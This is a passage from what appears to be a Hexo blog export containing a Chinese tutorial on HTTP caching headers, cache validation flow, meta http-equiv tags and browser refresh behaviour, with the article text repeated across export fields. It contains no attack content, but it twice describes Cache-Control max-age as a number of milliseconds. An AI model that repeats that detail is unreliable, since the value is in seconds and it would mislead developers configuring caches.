这几类文件，我们可以针对这几类文件做一些缓存层级\n\n| 文件      | 缓存层级                                |\n| --------- | --------------------------------------- |\n| HTML      | Cache-Control: no-cache,must-revalidate |\n| JS        | Cache-Control:private,max-age=86400     |\n| CSS       | Cache-Control:max-age=2629000           |\n| img\\fonts | Cache-Control:max-age=2629000           |\n\n上面只是一个简单的设置，要知道HTML是一定不能缓存的(大部分网页)。 缓存设置时间应该在你版本稳定之后设置，否则会得不偿失。 另外设置Cache-Control还可以配合ETag或者Last-Modified进行补偿验证，如果后面文件变化也可以及时反映出来。\n\n## 五、用户刷新/访问行为\n\n我们可以把刷新/访问界面的手段分成以下几类：\n\n- **在URI输入栏中输入然后回车 / 通过书签访问 / 通过浏览器前进后退按钮 / 通过页面中的a标签链接进行访问**\n\n  返回`200 OK (from cache)`，浏览器发现该资源已经缓存了而且没有过期（通过Expires头部或者Cache-Control头部），没有跟服务器确认，而是直接使用了浏览器缓存的内容。\n\n- **F5 / 点击工具栏中的刷新按钮 / 右键菜单重新加载**\n\n  F5会让浏览器**无论如何都发一个HTTP Request给Server**，即使先前的响应中有Expires头部。并且浏览器会在Request header中添加这样的字段:\n\n  ```\n  Cache-Control: max-age=0\n  If-Modified-Since: Fri, 15 Jul 2016 04:11:51 GMT\n  ```\n\n  其中Cache-Control是Chrome强制加上的，而If-Modified-Since是因为获取该资源的时候包含了Last-Modified头部，浏览器会使用If-Modified-Since头部信息重新发送该时间以确认资源是否需要重新发送。 实际上Server没有修改这个文件，所以返回了一个`304(Not Modified)`\n\n- **Ctl+F5**\n\n  Ctrl+F5要的是**彻底的从Server拿一份新的资源过来**，所以不光要发送HTTP request给Server，而且这个请求里面连If-Modified-Since/If-None-Match都没有，这样就逼着Server不能返回304，而是把整个资源原原本本地返回一份\n\n  实际上，为了保证拿到的是从Server上最新的，Ctrl+F5不只是去掉了If-Modified-Since/If-None-Match，还需要添加一些HTTP Headers。按照HTTP/1.1协议，Cache不光只是存在Browser终端，从Browser到Server之间的中间节点(比如Proxy)也可能扮演Cache的作用，为了防止获得的只是这些中间节点的Cache，需要告诉他们，别用自己的Cache敷衍我，往Upstream的节点要一个最新的copy吧。\n  在Chrome 51 中会包含两个头部信息， 作用就是让中间的Cache对这个请求失效，这样返回的绝对是新鲜的资源。\n\n  ```\n  Cache-Control: no-cache\n  Pragma: no-cache\n  ```\n\n  参考自[HTTP缓存控制小结](http://imweb.io/topic/5795dcb6fb312541492eda8c)\n\n\n\n\n## 参考\n\n1. [【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法](https://zhuanlan.zhihu.com/p/24467558)\n2. [rfc2616 14.Header Field Definitions](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html)\n3. [浅谈浏览器http的缓存机制-Vajoy](http://www.cnblogs.com/vajoy/p/5341664.html)\n4. [MDN | HTTP缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ)\n5. [MDN | HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)\n6. [Google Developer HTTP缓存](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn)\n7. [网站优化：浏览器缓存控制简介及配置策略](https://www.renfei.org/blog/http-caching.html)\n8. [HTTP缓存控制小结--总结了刷新页面的不同方式的影响](http://imweb.io/topic/5795dcb6fb312541492eda8c)\n9. [浏览器的缓存](https://segmentfault.com/a/1190000004486640)\n10. [w3.org | HTML4 | META and HTTP headers](https://www.w3.org/TR/html4/struct/global.html#h-7.4.4)\n11. [w3.org | HTML5 | META Pragma directives](https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives)\n12. [HTML meta tags vs HTTP response headers](https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers)\n13. [HTTP缓存控制小结](http://imweb.io/topic/5795dcb6fb312541492eda8c)\n\n\n\n\n**技术博客为了总结整理知识和帮助别人**\n\n\n\n\n","source":"_posts/HTTP_cache.md","raw":"---\ntitle: HTTP缓存机制大局观\ndate: 2018-03-02 21:30:00\ncategories: http\ntags: [http] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结和概括，以帮助建立知识体系。\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n\n## 前言及缓存字段分类\n\n前端涉及到缓存这一概念的地方包括HTTP缓存、以`localStorage`为代表的本地存储缓存（`sessionStorage`、`indexDB`、`web SQL`等），本文主要介绍HTTP缓存。HTTP请求中只有GET请求可以被缓存。\n\n网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结，阅读这篇文章可以帮助你产生一点大菊观，明白轻重缓急，如果看了却产生不了，那你当我是浮夸吧，夸张只因我孩怕XDD。。\n\n缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。设置缓存的好处：减少资源显示时间提升性能；减少服务器压力。HTTP缓存机制使用多个字段来实现缓存控制，把这些字段进行分类有利于记忆和加深理解，经过梳理总结我发现大家会对这些字段有以下几种分类方法：\n\n### 1. 按照缓存判断的执行过程，分为：###\n\n参考自[【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法](https://zhuanlan.zhihu.com/p/24467558)\n\n- 缓存存储策略：`Cache-Control: public、private、no-cache、max-age、no-store`\n\n  前4项都可以缓存数据到本地，后者 `no-store` 则不会在客户端缓存任何响应数据。\n\n- 缓存过期策略：`Expires`、`Cache-Control`设置`max-age`、`no-cache`的情况\n\n- 缓存对比策略：`Etag/If-None-Match`、`Last-Modified/If-Modified-Since`\n\n其中`max-age`和`no-cache`是个混合体，可以同时设置两个类别的内容，既包含缓存存储策略，也包含缓存过期策略，`Cache-Control:max-age=3600`相当于\n\n```\nCache-Control:private/public\nExpires:<当前时间> + 3600\n```\n\n`Cache-Control:no-cache`相当于`Cache-Control:max-age=0`，相当于\n\n```\nCache-Control:private/publice\nExpires:<当前时间>\n```\n\n在这种分类下，浏览器会依次根据**是否存储、是否过期、是否对比一致**来进行缓存判断，如果设置时缺失某一项，浏览器会根据约定好的规则为这一项设置默认值。例如没有设定具体过期时间时，浏览器会根据以下**启发式缓存过期策略**设定过期时间：\n\n**把响应头中的Date字段和Last-Modified的差值的10%作为max-age的值，也就是作为缓存有效期**\n\n### 2.按照HTTP不同版本的字段，分为：\n\n- HTTP1.0中的字段：Pragma、Expires\n\n- HTTP1.1中的字段：Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since等\n\n  这种分类主要强调的是两点：\n\n  1. 关于Pragma：设置了Pragma就相当于设置了Cache-Control：no-cache，但是HTTP响应头不支持这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端，如低版本IE浏览器。\n  2. 同时设置了max-age和Expires的情况下，Expires被覆盖，以max-age为准\n\n### 3.按照使用频率，分为：###\n\n- 主要字段：Expires、Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since\n- 辅助字段：Vary、Date、Age\n\n### 4.按照能否被请求头、响应头支持，分为：###\n\n参考自[rfc2616 14.Header Field Definitions](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html)\n\n​           [浅谈浏览器http的缓存机制-Vajoy](http://www.cnblogs.com/vajoy/p/5341664.html)\n\n- 请求头字段(request-header)：If-Match、If-None-Match、If-Modified-Since、If-Unmodified-Since\n\n- 响应头字段(response-header)：Age、Etag\n\n- 通用头部字段(general-header)：Cache-Control、Date、Pragma\n\n- 实体首部字段(entity-header )：Expires、Last-Modified、\n\n实体首部字段定义：For entity-header fields, both sender and recipient refer to either the client or the server, depending on who sends and who receives the entity。在我理解，这样也就是说Client或Server可以作为接收端或发送端，具体取决于它们在一次首发过程中扮演的角色，也就是说既可以出现在请求头中也可以出现在响应头中吗？这点还不太理解。（TODO）\n\n以下是表格：\n\n   **1. 通用首部字段**（就是请求报文和响应报文都能用上的字段）\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161150504-1030837643.png)\n\n   **2. 请求首部字段**\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161240301-2050921595.png)\n\n   **3. 响应首部字段**\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161311394-1246877214.png)\n\n   **4. 实体首部字段**\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401171410441-767100632.png)\n\n但是，MDN上说HTTP响应头不支持Pragma（TODO），并且通常Last-Modified会用在响应头里面。\n\n## 一、常用缓存字段\n\n### 1. 主要字段：\n\n#### 1.Expires\n\n- HTTP1.0时期的缓存过期控制字段，是相对于服务器时间的绝对时间，不同服务器之间的时间设置可能不同，这种不一致存在隐患\n- 值为GMT格式的日期，设定在当前时间之前相当于立即过期，相当于Cache-Control：no-cache\n- 与Cache-Control：max-age=<毫秒数>共存时，被其覆盖并失效\n- Pragma与Expires共存时，Pragma胜出，Expires失效\n\n#### 2.Cache-control\n\n- **public/private**\n\n  `public`表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。\n\n  `private`表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）。\n\n- **max-age**\n\n  值为一个毫秒数，表示缓存过期的相对时间，优先级高于Expires\n\n- **s-maxage=<seconds>**\n\n  覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。\n\n- **no-cache**\n\n  允许保存缓存副本 ，但是不能直接使用缓存副本，必须先去服务器提交验证请求，验证是否过期、已修改，如果验证没有过期、没有修改，即返回304状态，就可以使用缓存副本\n\n- **no-store**：不允许保存缓存副本\n\n- **must-revalidate**\n\n  缓存必须在使用之前验证旧资源的状态，并且不可使用过期资源。和no-cache比较相似\n\n- **min-fresh=<seconds>**\n\n  表示客户端希望在指定的时间内获取最新的响应。\n\n若报文中同时出现了 Pragma、Expires 和 Cache-Control，会以 Cache-Control 为准，其它Cache-Control值略\n\n#### 3.Etag / If-None-Match\n\n- 服务器端为资源打的一个标记，标记资源有无修改，服务端资源修改后就修改Etag值\n- “W\\”开头的Etag表示开启弱校验，当有了较多修改之后才会修改Etag值，默认使用强校验，即按字节进行对比\n\n#### 4.Last-Modified / If-Modified-Since\n\n- Last-Modified标记资源最后被修改的时间，是一个GMT格式的时间值\n- 如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端*（即使客户端缓存里有个一模一样的资源）*，所以通常配合Etag一起使用，可以达到较好的控制缓存的效果\n- 如果 Last-Modified 和 ETag 同时被使用，则要求它们的验证都必须通过才会返回304，若其中某个验证没通过，则服务器会按常规返回资源实体及200状态码。\n\n### 2. 辅助字段：\n\n#### 1.Vary\n\n参考[MDN|HTTP缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ)\n\n控制代理服务器直接使用缓存资源返回还是向源服务器发起请求。当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。\n\n![The Vary header leads cache to use more HTTP headers as key for the cache.](https://mdn.mozillademos.org/files/13769/HTTPVary.png)\n\n使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助google或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入[Cloaking](https://en.wikipedia.org/wiki/Cloaking)。\n\n#### 2.Date和Age\n\nDate 是原服务器发送该资源响应报文的时间（GMT格式），如果你发现 Date 的时间与“当前时间”差别较大，或者连续F5刷新发现 Date 的值都没变化，则说明你当前请求是命中了代理服务器的缓存。\n\nAge表示资源在代理服务器中存在的时间*（秒）*，如文件被修改或替换，Age会重新由0开始累计。\n\n```\n静态资源Age + 静态资源Date = 原服务端Date\n```\n\n不过这条规则也不一定准确，特别是当原服务器经常修改系统时间的情况下。\n\n## 二、缓存判断流程\n\n参考[Google Developer HTTP缓存](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn)\n\n![缓存决策树](http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/28130284.jpg)\n\n\n\n这个图可以说是设置缓存的参考策略，也可以据此判断浏览器判断是否使用缓存的大概流程：\n\n1. 由Expires、Pragma、max-age等判断缓存是否过期，未过期直接使用缓存，已过期进行下一步\n\n2. 发起请求，请求头附带If-None-Match和If-Modified-Since，服务器由If-Modified-Since与其Last-Modified对比，如果不一致直接反回新版本的资源，否则需要再判断If-None-Match和Etag是否一致，如果不一致直接返回新版本资源，否则返回304状态码，浏览器就可以直接使用本地的缓存副本\n\n![浏览器的缓存判断流程](http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/8668139.jpg)\n\n另外需要注意的是，Chrome浏览器中，当缓存未过期直接使用缓存时，在Dev Tools的network选项卡中显示的是200 OK (from cache)。\n\n## 三、前端设置\n\n### 1. HTTP header字段设置###\n\n涉及到前端人员需要设置的HTTP header字段有哪些呢？通过前面按照能否被请求头、响应头支持这一标准进行的分类中，我们知道请求首部字段有：If-Match / If-None-Match、If-Modified-Since / If-Unmodified-Since，这几个值通常是首先服务器发回Etag、Last-Modified，然后浏览器自动加在请求头里面的，所以一般不用前端人员进行设置。**通用首部字段有：Cache-Control、Pragma，也就是说作为前端人员，可以通过对这两个字段进行设置以控制缓存。**（TODO）\n\n### 2. Meta http-equiv设置缓存###\n\nHTML4中支持在meta标签的http-equiv属性中使用http头部缓存控制字段，包括Expires、Pragma、Cache-Control等。\n\n```\n<meta http-equiv=\"Cache-Control\" content=\"no-cache, no-store, must-revalidate\" />\n<meta http-equiv=\"Pragma\" content=\"no-cache\" />\n<meta http-equiv=\"Expires\" content=\"0\" />\n```\n\n> The [http-equiv](https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv) attribute can be used in place of the name attribute and has a special significance when documents are retrieved via the Hypertext Transfer Protocol (HTTP). HTTP servers may use the property name specified by the [http-equiv](https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv) attribute to create an [[RFC822\\]](https://www.w3.org/TR/html4/references.html#ref-RFC822)-style header in the HTTP response. Please see the HTTP specification ([[RFC2616\\]](https://www.w3.org/TR/html4/references.html#ref-RFC2616)) for details on valid HTTP headers.\n\n参考自[w3.org | HTML4 | META and HTTP headers](https://www.w3.org/TR/html4/struct/global.html#h-7.4.4)\n\nHTML5中已经不再包含这样的用法。参考自[w3.org | HTML5 | META Pragma directives](https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives)\n\n当同时在meta标签中设置了缓存控制字段并在HTTP header中设置了这些字段时，会优先使用HTTP header字段。另外有的代理服务器可能会不认这个设置，为了避免造成冲突和混乱，建议只使用HTTP header设置缓存。另外META http-equiv适用于在file:// 本地文件中使用。\n\n> **[HTML meta tags vs HTTP response headers](https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers)**\n>\n> Important to know is that when a HTML page is served over a HTTP connection, and a header is present in **both** the HTTP response headers and the HTML `<meta http-equiv>` tags, then the one specified in the HTTP response header will get precedence over the HTML meta tag. The HTML meta tag will only be used when the page is viewed from local disk file system via a `file://` URL. See also [W3 HTML spec chapter 5.2.2](http://www.w3.org/TR/html4/charset.html#h-5.2.2). Take care with this when you don't specify them programmatically, because the webserver can namely include some default values.\n>\n> Generally, you'd better just **not** specify the HTML meta tags to avoid confusion by starters, and rely on hard HTTP response headers. Moreover, specifically those `<meta http-equiv>` tags are [**invalid**](http://validator.w3.org/) in HTML5. Only the `http-equiv` values listed in [HTML5 specification](http://dev.w3.org/html5/spec-preview/the-meta-element.html#attr-meta-http-equiv) are allowed.\n\n### 3.给静态资源加版本号Revved Resource###\n\n更多地利用缓存资源，可以提高网站的性能和相应速度。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。\n\nweb开发者发明了一种 Steve Sounders 称作加速（译者注：revving）的技术[[1\\]](https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/) 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。\n\n## 四、设置规则\n\n1. 为基本不会变动的资源设置非常长的过期时间，例如Image、Fonts、jQuery库文件等，以年为单位，例如淘宝网的logo图片设置了一年的max-age值\n\n2. 为定时变动的资源设置中等过期时间，例如CSS文件、JS文件，以版本更替的时间间隔为参考进行设置，如果在过期时间之前需要发新版本，为避免用户仍访问本地副本（因为本地副本还未过期），可使用加版本号的做法\n\n3. HTML文档不使用缓存或谨慎设定过期时间，因为其他资源（图片、CSS、JavaScript 等）的请求都来自一个单一的HTML 文档，如果被缓存了，那么页面中包含的资源的文件名等信息都会一并被缓存，导致对它的更新难以确保立即对用户生效。（TODO）\n\n一个网站，说白了就是HTML+JS+CSS+fonts+img 这几类文件，我们可以针对这几类文件做一些缓存层级\n\n| 文件      | 缓存层级                                |\n| --------- | --------------------------------------- |\n| HTML      | Cache-Control: no-cache,must-revalidate |\n| JS        | Cache-Control:private,max-age=86400     |\n| CSS       | Cache-Control:max-age=2629000           |\n| img\\fonts | Cache-Control:max-age=2629000           |\n\n上面只是一个简单的设置，要知道HTML是一定不能缓存的(大部分网页)。 缓存设置时间应该在你版本稳定之后设置，否则会得不偿失。 另外设置Cache-Control还可以配合ETag或者Last-Modified进行补偿验证，如果后面文件变化也可以及时反映出来。\n\n## 五、用户刷新/访问行为\n\n我们可以把刷新/访问界面的手段分成以下几类：\n\n- **在URI输入栏中输入然后回车 / 通过书签访问 / 通过浏览器前进后退按钮 / 通过页面中的a标签链接进行访问**\n\n  返回`200 OK (from cache)`，浏览器发现该资源已经缓存了而且没有过期（通过Expires头部或者Cache-Control头部），没有跟服务器确认，而是直接使用了浏览器缓存的内容。\n\n- **F5 / 点击工具栏中的刷新按钮 / 右键菜单重新加载**\n\n  F5会让浏览器**无论如何都发一个HTTP Request给Server**，即使先前的响应中有Expires头部。并且浏览器会在Request header中添加这样的字段:\n\n  ```\n  Cache-Control: max-age=0\n  If-Modified-Since: Fri, 15 Jul 2016 04:11:51 GMT\n  ```\n\n  其中Cache-Control是Chrome强制加上的，而If-Modified-Since是因为获取该资源的时候包含了Last-Modified头部，浏览器会使用If-Modified-Since头部信息重新发送该时间以确认资源是否需要重新发送。 实际上Server没有修改这个文件，所以返回了一个`304(Not Modified)`\n\n- **Ctl+F5**\n\n  Ctrl+F5要的是**彻底的从Server拿一份新的资源过来**，所以不光要发送HTTP request给Server，而且这个请求里面连If-Modified-Since/If-None-Match都没有，这样就逼着Server不能返回304，而是把整个资源原原本本地返回一份\n\n  实际上，为了保证拿到的是从Server上最新的，Ctrl+F5不只是去掉了If-Modified-Since/If-None-Match，还需要添加一些HTTP Headers。按照HTTP/1.1协议，Cache不光只是存在Browser终端，从Browser到Server之间的中间节点(比如Proxy)也可能扮演Cache的作用，为了防止获得的只是这些中间节点的Cache，需要告诉他们，别用自己的Cache敷衍我，往Upstream的节点要一个最新的copy吧。\n  在Chrome 51 中会包含两个头部信息， 作用就是让中间的Cache对这个请求失效，这样返回的绝对是新鲜的资源。\n\n  ```\n  Cache-Control: no-cache\n  Pragma: no-cache\n  ```\n\n  参考自[HTTP缓存控制小结](http://imweb.io/topic/5795dcb6fb312541492eda8c)\n\n\n\n\n## 参考\n\n1. [【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法](https://zhuanlan.zhihu.com/p/24467558)\n2. [rfc2616 14.Header Field Definitions](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html)\n3. [浅谈浏览器http的缓存机制-Vajoy](http://www.cnblogs.com/vajoy/p/5341664.html)\n4. [MDN | HTTP缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ)\n5. [MDN | HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)\n6. [Google Developer HTTP缓存](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn)\n7. [网站优化：浏览器缓存控制简介及配置策略](https://www.renfei.org/blog/http-caching.html)\n8. [HTTP缓存控制小结--总结了刷新页面的不同方式的影响](http://imweb.io/topic/5795dcb6fb312541492eda8c)\n9. [浏览器的缓存](https://segmentfault.com/a/1190000004486640)\n10. [w3.org | HTML4 | META and HTTP headers](https://www.w3.org/TR/html4/struct/global.html#h-7.4.4)\n11. [w3.org | HTML5 | META Pragma directives](https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives)\n12. [HTML meta tags vs HTTP response headers](https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers)\n13. [HTTP缓存控制小结](http://imweb.io/topic/5795dcb6fb312541492eda8c)\n\n\n\n\n**技术博客为了总结整理知识和帮助别人**\n\n\n\n\n","slug":"HTTP_cache","published":1,"updated":"2018-08-04T03:36:53.246Z","_id":"cjgw444eq003h8d95y14qql6y","layout":"post","photos":[],"link":"","content":"<p>网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结和概括，以帮助建立知识体系。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"前言及缓存字段分类\"><a href=\"#前言及缓存字段分类\" class=\"headerlink\" title=\"前言及缓存字段分类\"></a>前言及缓存字段分类</h2><p>前端涉及到缓存这一概念的地方包括HTTP缓存、以<code>localStorage</code>为代表的本地存储缓存（<code>sessionStorage</code>、<code>indexDB</code>、<code>web SQL</code>等），本文主要介绍HTTP缓存。HTTP请求中只有GET请求可以被缓存。</p>\n<p>网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结，阅读这篇文章可以帮助你产生一点大菊观，明白轻重缓急，如果看了却产生不了，那你当我是浮夸吧，夸张只因我孩怕XDD。。</p>\n<p>缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。设置缓存的好处：减少资源显示时间提升性能；减少服务器压力。HTTP缓存机制使用多个字段来实现缓存控制，把这些字段进行分类有利于记忆和加深理解，经过梳理总结我发现大家会对这些字段有以下几种分类方法：</p>\n<h3 id=\"1-按照缓存判断的执行过程，分为：\"><a href=\"#1-按照缓存判断的执行过程，分为：\" class=\"headerlink\" title=\"1. 按照缓存判断的执行过程，分为：\"></a>1. 按照缓存判断的执行过程，分为：</h3><p>参考自<a href=\"https://zhuanlan.zhihu.com/p/24467558\" target=\"_blank\" rel=\"noopener\">【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法</a></p>\n<ul>\n<li><p>缓存存储策略：<code>Cache-Control: public、private、no-cache、max-age、no-store</code></p>\n<p>前4项都可以缓存数据到本地，后者 <code>no-store</code> 则不会在客户端缓存任何响应数据。</p>\n</li>\n<li><p>缓存过期策略：<code>Expires</code>、<code>Cache-Control</code>设置<code>max-age</code>、<code>no-cache</code>的情况</p>\n</li>\n<li><p>缓存对比策略：<code>Etag/If-None-Match</code>、<code>Last-Modified/If-Modified-Since</code></p>\n</li>\n</ul>\n<p>其中<code>max-age</code>和<code>no-cache</code>是个混合体，可以同时设置两个类别的内容，既包含缓存存储策略，也包含缓存过期策略，<code>Cache-Control:max-age=3600</code>相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control:private/public</span><br><span class=\"line\">Expires:&lt;当前时间&gt; + 3600</span><br></pre></td></tr></table></figure>\n<p><code>Cache-Control:no-cache</code>相当于<code>Cache-Control:max-age=0</code>，相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control:private/publice</span><br><span class=\"line\">Expires:&lt;当前时间&gt;</span><br></pre></td></tr></table></figure>\n<p>在这种分类下，浏览器会依次根据<strong>是否存储、是否过期、是否对比一致</strong>来进行缓存判断，如果设置时缺失某一项，浏览器会根据约定好的规则为这一项设置默认值。例如没有设定具体过期时间时，浏览器会根据以下<strong>启发式缓存过期策略</strong>设定过期时间：</p>\n<p><strong>把响应头中的Date字段和Last-Modified的差值的10%作为max-age的值，也就是作为缓存有效期</strong></p>\n<h3 id=\"2-按照HTTP不同版本的字段，分为：\"><a href=\"#2-按照HTTP不同版本的字段，分为：\" class=\"headerlink\" title=\"2.按照HTTP不同版本的字段，分为：\"></a>2.按照HTTP不同版本的字段，分为：</h3><ul>\n<li><p>HTTP1.0中的字段：Pragma、Expires</p>\n</li>\n<li><p>HTTP1.1中的字段：Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since等</p>\n<p>这种分类主要强调的是两点：</p>\n<ol>\n<li>关于Pragma：设置了Pragma就相当于设置了Cache-Control：no-cache，但是HTTP响应头不支持这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端，如低版本IE浏览器。</li>\n<li>同时设置了max-age和Expires的情况下，Expires被覆盖，以max-age为准</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"3-按照使用频率，分为：\"><a href=\"#3-按照使用频率，分为：\" class=\"headerlink\" title=\"3.按照使用频率，分为：\"></a>3.按照使用频率，分为：</h3><ul>\n<li>主要字段：Expires、Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since</li>\n<li>辅助字段：Vary、Date、Age</li>\n</ul>\n<h3 id=\"4-按照能否被请求头、响应头支持，分为：\"><a href=\"#4-按照能否被请求头、响应头支持，分为：\" class=\"headerlink\" title=\"4.按照能否被请求头、响应头支持，分为：\"></a>4.按照能否被请求头、响应头支持，分为：</h3><p>参考自<a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html\" target=\"_blank\" rel=\"noopener\">rfc2616 14.Header Field Definitions</a></p>\n<p>​           <a href=\"http://www.cnblogs.com/vajoy/p/5341664.html\" target=\"_blank\" rel=\"noopener\">浅谈浏览器http的缓存机制-Vajoy</a></p>\n<ul>\n<li><p>请求头字段(request-header)：If-Match、If-None-Match、If-Modified-Since、If-Unmodified-Since</p>\n</li>\n<li><p>响应头字段(response-header)：Age、Etag</p>\n</li>\n<li><p>通用头部字段(general-header)：Cache-Control、Date、Pragma</p>\n</li>\n<li><p>实体首部字段(entity-header )：Expires、Last-Modified、</p>\n</li>\n</ul>\n<p>实体首部字段定义：For entity-header fields, both sender and recipient refer to either the client or the server, depending on who sends and who receives the entity。在我理解，这样也就是说Client或Server可以作为接收端或发送端，具体取决于它们在一次首发过程中扮演的角色，也就是说既可以出现在请求头中也可以出现在响应头中吗？这点还不太理解。（TODO）</p>\n<p>以下是表格：</p>\n<p>   <strong>1. 通用首部字段</strong>（就是请求报文和响应报文都能用上的字段）<br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161150504-1030837643.png\" alt=\"img\"></p>\n<p>   <strong>2. 请求首部字段</strong><br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161240301-2050921595.png\" alt=\"img\"></p>\n<p>   <strong>3. 响应首部字段</strong><br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161311394-1246877214.png\" alt=\"img\"></p>\n<p>   <strong>4. 实体首部字段</strong><br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401171410441-767100632.png\" alt=\"img\"></p>\n<p>但是，MDN上说HTTP响应头不支持Pragma（TODO），并且通常Last-Modified会用在响应头里面。</p>\n<h2 id=\"一、常用缓存字段\"><a href=\"#一、常用缓存字段\" class=\"headerlink\" title=\"一、常用缓存字段\"></a>一、常用缓存字段</h2><h3 id=\"1-主要字段：\"><a href=\"#1-主要字段：\" class=\"headerlink\" title=\"1. 主要字段：\"></a>1. 主要字段：</h3><h4 id=\"1-Expires\"><a href=\"#1-Expires\" class=\"headerlink\" title=\"1.Expires\"></a>1.Expires</h4><ul>\n<li>HTTP1.0时期的缓存过期控制字段，是相对于服务器时间的绝对时间，不同服务器之间的时间设置可能不同，这种不一致存在隐患</li>\n<li>值为GMT格式的日期，设定在当前时间之前相当于立即过期，相当于Cache-Control：no-cache</li>\n<li>与Cache-Control：max-age=&lt;毫秒数&gt;共存时，被其覆盖并失效</li>\n<li>Pragma与Expires共存时，Pragma胜出，Expires失效</li>\n</ul>\n<h4 id=\"2-Cache-control\"><a href=\"#2-Cache-control\" class=\"headerlink\" 